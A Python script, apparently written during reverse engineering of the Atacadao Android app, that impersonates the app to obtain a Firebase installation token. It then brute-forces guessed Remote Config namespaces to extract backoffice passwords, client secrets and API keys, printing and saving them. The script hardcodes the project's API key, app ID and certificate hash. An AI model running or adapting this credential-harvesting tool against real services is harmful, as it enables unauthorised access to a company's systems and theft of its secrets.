"""Enumerate Firebase Remote Config namespaces for the Atacadao app.

The first fetch (namespace 'firebase') returned 399 entries but is missing
`in_store_offers_api_key`, `in_store_offers_backoffice_client_secret` and
`in_store_offers_backoffice_password`, which the app clearly knows about.
Those may live in a tenant namespace.
"""
from __future__ import annotations

import json
import secrets
import urllib.error
import urllib.request

PROJECT = "atacadao-b6521"
APP_ID = "1:579536695495:android:3af4b608ce65ef651a4ee2"
API_KEY = "AIzaSyChy2c53_XP1jN6NGS3Qoi1Jv0GG7J_A90"
PACKAGE = "br.com.atacadao.b2c.app"
CERT_SHA1 = "97B1257A29CBA1049C4B1F2D4DE3DBE5B1262040"
APP_VERSION = "13.429.1"

NAMESPACES = [
    "firebase",
    "appconfig",
    "app_config",
    "atacadao",
    "atacadaobr",
    "atacadaobrqaapp",
    "atacadaobrapp",
    "meu_atacadao",
    "meuatacadao",
    "default",
    "config",
    "configs",
    "prod",
    "production",
    "white_label",
    "whitelabel",
    "kobe",
    "tenant",
    "mobile",
    "app",
    "remote_config",
    "in_store_offers",
    "offers",
    "ambiente",
    "env",
]


def post(url: str, body: dict, headers: dict) -> tuple[int, object]:
    req = urllib.request.Request(url, data=json.dumps(body).encode(), headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=45) as resp:
            return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")
    except Exception as exc:  # noqa: BLE001
        return 0, str(exc)


def main() -> None:
    fid = secrets.token_urlsafe(17)[:22]
    status, result = post(
        f"https://firebaseinstallations.googleapis.com/v1/projects/{PROJECT}/installations",
        {"appId": APP_ID, "authVersion": "FIS_v2", "fid": fid, "sdkVersion": "a:17.0.0"},
        {
            "x-goog-api-key": API_KEY,
            "X-Android-Package": PACKAGE,
            "X-Android-Cert": CERT_SHA1,
            "Content-Type": "application/json",
        },
    )
    if status != 200 or not isinstance(result, dict):
        print("FIS failed", status, result)
        return
    token = result["authToken"]["token"]
    print("FIS ok, fid:", fid)

    for ns in NAMESPACES:
        url = (
            f"https://firebaseremoteconfig.googleapis.com/v1/projects/{PROJECT}"
            f"/namespaces/{ns}:fetch?key={API_KEY}"
        )
        status2, result2 = post(
            url,
            {
                "app_instance_id": fid,
                "app_instance_id_token": token,
                "app_id": APP_ID,
                "app_version": APP_VERSION,
                "country_code": "BR",
                "language_code": "pt-BR",
                "platform_version": "30",
                "time_zone": "America/Sao_Paulo",
                "package_name": PACKAGE,
                "sdk_version": "22.0.0",
                "analytics_user_properties": {},
            },
            {
                "X-Goog-Firebase-Installations-Auth": token,
                "x-goog-api-key": API_KEY,
                "X-Android-Package": PACKAGE,
                "X-Android-Cert": CERT_SHA1,
                "Content-Type": "application/json",
            },
        )
        if isinstance(result2, dict) and "entries" in result2:
            entries = result2["entries"]
            hit = [k for k in entries if "secret" in k.lower() or "api_key" in k.lower()]
            print(f"  {ns:<20} 200 entries={len(entries)}  secrets={hit}")
            if hit:
                with open(rf"C:\Android\capture\rc_{ns}.json", "w", encoding="utf-8") as fh:
                    json.dump(result2, fh, ensure_ascii=False, indent=2)
                for k in hit:
                    print(f"      {k} = {entries[k]!r}")
        else:
            text = str(result2)[:120].replace("\n", " ")
            print(f"  {ns:<20} {status2} {text}")


if __name__ == "__main__":
    main()
